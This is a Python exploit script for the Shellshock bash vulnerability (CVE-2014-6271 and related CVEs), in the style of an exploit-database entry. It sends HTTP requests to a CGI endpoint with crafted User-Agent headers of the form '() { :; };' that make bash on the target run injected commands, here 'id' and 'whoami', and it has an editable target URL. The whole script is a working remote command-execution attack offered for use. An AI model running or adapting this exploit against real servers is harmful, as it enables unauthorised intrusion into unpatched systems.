#!/usr/bin/python

# Exploit Title: Shellshock
# Google Dork: -
# Date: 06/05/2015
# Exploit Author: Kapi
# Vendor Homepage: -
# Software Link: -
# Affected Version: versions 1.14 (released in 1994) to the most recent version 4.3 
# Tested on: 
# - CentOS release 6.4 (Final), PHP Version 5.3.3,Server API: CGI/FastCGI
# CVE : (CVE-2014-6271, CVE-2014-6277, CVE-2014-6278, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187)
# Usage: 
# python library "httplib2": https://pypi.python.org/pypi/httplib2

import sys
import httplib2
from urllib import urlencode
import time
import socket

def send(fullURL,headers):
    # http = httplib2.Http()
    http = httplib2.Http(proxy_info = httplib2.ProxyInfo(httplib2.socks.PROXY_TYPE_HTTP_NO_TUNNEL, '192.168.159.131', 3128) )
    body = {}
    response, content = http.request(fullURL, 'GET', headers=headers, body=urlencode(body))
    return (content)

# Edit here
fullURL = "http://192.168.159.131/cgi-bin/status"
host = "192.168.159.131"
print ("[*] Full : " + fullURL)


print "-------------------------------"
print "[*] Testing ... "

try:
	command = "/usr/bin/id"
	header = '() { xxxxxxxxxxxxxxxxxx; }; echo ; echo ; '+command+';'
	headers = {'User-Agent': header, 'Host': "" + host }
	print "[*] Type 1 >> " + header
	print "[*] Executing command:" + command
	content = send(fullURL,headers)
	print str(content)
except (httplib2.HttpLib2Error,socket.error) as ex:
    print '[!] Checking ' + fullURL + ' >> ' + "error, check URL"

try:
	command = "/usr/bin/whoami"
	header = '() { :; }; echo ; echo ; /bin/bash -c  '+command+';'
	headers = {'User-Agent': header, 'Host': "" + host }
	print "[*] Type 2 >> " + header
	print "[*] Executing command:" + command
	content = send(fullURL,headers)
	print str(content)
except (httplib2.HttpLib2Error,socket.error) as ex:
    print '[!] Checking ' + fullURL + ' >> ' + "error, check URL"


